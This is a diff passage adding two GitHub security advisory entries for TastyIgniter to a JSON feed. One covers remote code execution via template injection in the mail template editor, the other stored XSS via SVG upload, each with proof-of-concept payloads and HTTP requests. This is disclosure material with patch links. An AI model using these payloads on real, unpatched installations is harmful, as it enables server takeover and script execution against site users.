+      "description": "### Summary\n**Where:** `POST /admin/mail_templates/edit/{id}` → body field  \n**Who can trigger:** Any admin user with `Admin.MailTemplates` permission  \n**Impact:** Arbitrary PHP execution on the server — full RCE\n\n### Details\nThe Mail templates is vulnerable to SSTI and did not perform an validation and sanitization.\n\n### PoC\n\n- login as admin\n- create new mail template with following command\n\n```\n@php echo shell_exec('echo \"RCE Executed\";id'); @endphp\n```  \n\n- save the request\n- execute the request using `X-IGNITER-REQUEST-HANDLER: onTestTemplate`\n\nRequest\n```http\nPOST /admin/mail_templates/edit/20 HTTP/1.1\nHost: localhost:8888\nContent-Length: 47\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-Requested-With: XMLHttpRequest\nX-IGNITER-REQUEST-PARTIALS: \nAccept: */*\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-IGNITER-REQUEST-HANDLER: onTestTemplate\nOrigin: http://localhost:8888\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/admin/mail_templates/edit/20\nAccept-Encoding: gzip, deflate, br\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6IjhvRGwrR1drU2JrTEhqcHh6QlNRdFE9PSIsInZhbHVlIjoiT2dpbUpNMGZkZzZUNVNZTFkyOFJtc25sZ2FXR3NxQ3JLMFBWUk5wNnl2WWtaNlpsNnBDYldFNkpMbEFKeVhnbjZWQW1MZzZPT3NjNlV0V3l5Z1NMVG9jamNFK0dzbFA4LzZhREFSNFFHQVNSTmJYOEFiOG0rZ0s2T1VQVmdCTlNrMVZ2dHBqMXMxazV5QWp2cXRCSjhoaU81aTlDeVBzaC9nbHlJRlM5SlYveDdTL2RUSG56NGZLQWNqOHVUTW5XalhjdWpwN1c3TjF6OGw3WVpNUndrZUY3dmRDQy8zR1J6MzJtaE81L1VxMD0iLCJtYWMiOiJmYzI5Y2E0ZTkyOTUyN2I5YmYzZjQzZWE0MDY2YTk0NTRkOWQ3MTEyODRmZjBjNzU2MGMyZWQwNmEwYWY5MDc1IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IlZpTmZQTTREUHhpTE44ZUgxZVZ5Zmc9PSIsInZhbHVlIjoiOTRWSUtCQjM2ZmRwdjA3MVI2aHBjM3dITDViL0t0ajlPd1dTQ0xCZ3IxVGNGQWk2bzlDUEtLeFRZTlBXZDc2V0tuREZWVTVBakJTRjU4d052aEZxeUEvcU1BVFhmMjlPY2RGOHdWY1p4d25saSs0UHovZzFQaU1FeU9vKy9tbEoiLCJtYWM",
+      "publishedAt": "2026-11-25T22:24:13Z",
+      "updatedAt": "2026-11-25T22:24:14Z",
+      "url": "https://github.com/advisories/GHSA-743w-g9pf-8p94",
+      "references": [
+        "https://github.com/tastyigniter/TastyIgniter/security/advisories/GHSA-743w-g9pf-8p94",
+        "https://github.com/tastyigniter/core/commit/785aa660f77fee9a221857b8b1f11b68a35fd257",
+        "https://github.com/tastyigniter/core/releases/tag/v4.3.1",
+        "https://github.com/advisories/GHSA-743w-g9pf-8p94"
+      ],
+      "patchUrls": [
+        "https://github.com/tastyigniter/core/commit/785aa660f77fee9a221857b8b1f11b68a35fd257"
+      ],
+      "packages": [
+        {
+          "ecosystem": "composer",
+          "name": "tastyigniter/tastyigniter",
+          "lt": "4.3.1",
+          "id": "CVE-2026-69178",
+          "ghsaId": "GHSA-743w-g9pf-8p94",
+          "cve": "CVE-2026-69178",
+          "cwe": "CWE-1336",
+          "sev": "critical",
+          "note": "TastyIgniter mail template editor allows remote code execution via server-side template injection"
+        }
+      ],
+      "kev": false,
+      "epss": 0
+    },
+    {
+      "id": "CVE-2026-69177",
+      "ghsaId": "GHSA-mqg7-fw3f-mhp7",
+      "cve": "CVE-2026-69177",
+      "cwe": "CWE-1395",
+      "sev": "medium",
+      "summary": "TastyIgniter allows stored XSS via file upload",
+      "description": "### Summary\nStored XSS via uploading SVG files \n\n### Details\nIt is possible to upload SVG files that contains XSS.\n\n### PoC\n\n- login as admin\n- create the following SVG file\n\n```\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"400\" height=\"400\" viewBox=\"0 0 124 124\" fill=\"none\">\n<rect width=\"124\" height=\"124\" rx=\"24\" fill=\"#000000\"/>\n   <script type=\"text/javascript\">  \n      alert(1);\n   </script>\n</svg>\n```  \n\n- upload the SVG file in media manager\n\n```\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 514\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nAccept: application/json\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryc7RU1N0XsTAvSLFw\nOrigin: http://localhost:8888\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/admin/media_manager\nAccept-Encoding: gzip, deflate, br\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6InF4RFZUdStuQkY0cGRLU2s4NUFiQ1E9PSIsInZhbHVlIjoiUjMyRUp6UGI3ZFRsL0dhY3pDSUhtMDJaY3Y5bXZ6SFlkQVR5MzZzdGZOT2ZRdExFQ1FJRUh5NDVmQlV0d0tNUXRackcxbTh0YWcxbHphV3dmTVdrNjR5aExhdzZUUFdLQ1JsSEhiMUlZRE1IblBuTFhmdVJWZFc5bFpicU4vS1BUZDh5OGRUMERTU1dsOEdnZVp0bXNpUFI5ZWFPM29RaGl3czU0cnlKczFsN0U4OGFnRWNjREM3aWFSRUtaYTVVTkRmSkV4RXlzZGRiK3RRcGVmOVk2dG1ud0NBaXVFTDRHRVM0Nk9MWDNaUT0iLCJtYWMiOiJiZjA3OGVhMjZlZjQ5ZDczNDkxYmQ3NDBmYWFmNGI5NjNkZDFkMmI0ODAwMTU2MmE5MjMwNjJlMzU0OGM1ODg5IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6Ilp1alI5YUpNZnMzL2V0NEZiUm9wemc9PSIsInZhbHVlIjoiN1lhL2RhVG05MGtab2paOS90ZHJuQVdmUHNmbFRlbUpaekVKZUlxWnQyOWRYbm5IWENzMmJFZ0QvNjlNRnNjMnFHM3B1bGZJWVcyeXMxWG1sWW4rWnNiRFFVcXk2U3BFbHBDYWF4SnlFSE5rLzZ1QWFxem9mTHo3NER0eDVKUXEiLCJtYWMiOiI3ZThlOTEzZjY1MjdmNDc5NDY5MWU3MmRjOWU5ZTdjYTNjODQyOTllZjg3YWNiZTdhNTAzNjhmZmM0NTUyYTI0IiwidGFnIjoiIn0%3D; t",
+      "publishedAt": "2026-11-25T21:52:15Z",
+      "updatedAt": "2026-11-25T21:52:16Z",
+      "url": "https://github.com/advisories/GHSA-mqg7-fw3f-mhp7",
+      "references": [
+        "https://github.com/tastyigniter/TastyIgniter/security/advisories/GHSA-mqg7-fw3f-mhp7",
+        "https://github.com/tastyigniter/core/commit/c6f99d7f47d20c144721c7a1044213f52c9b570f",
+        "https://github.com/tastyigniter/core/releases/tag/v4.3.1",
+        "https://github.com/advisories/GHSA-mqg7-fw3f-mhp7"
+      ],
+      "patchUrls": [
+        "https://github.com/tastyigniter/core/commit/c6f99d7f47d20c144721c7a1044213f52c9b570f"
+      ],
+      "packages": [
+        {
+          "ecosystem": "composer",
+          "name": "tastyigniter/tastyigniter",
+          "lt": "4.3.1",
+          "id": "CVE-2026-69177",
+          "ghsaId": "GHSA-mqg7-fw3f-mhp7",
+          "cve": "CVE-2026-69177",
+          "cwe": "CWE-1395",
+          "sev": "medium",
+          "note": "TastyIgniter allows stored XSS via file upload"
+        }
+      ],
+      "kev": false,
+      "epss": 0
     },
     {
       "id": "GHSA-jp3c-6v3g-mpxv",
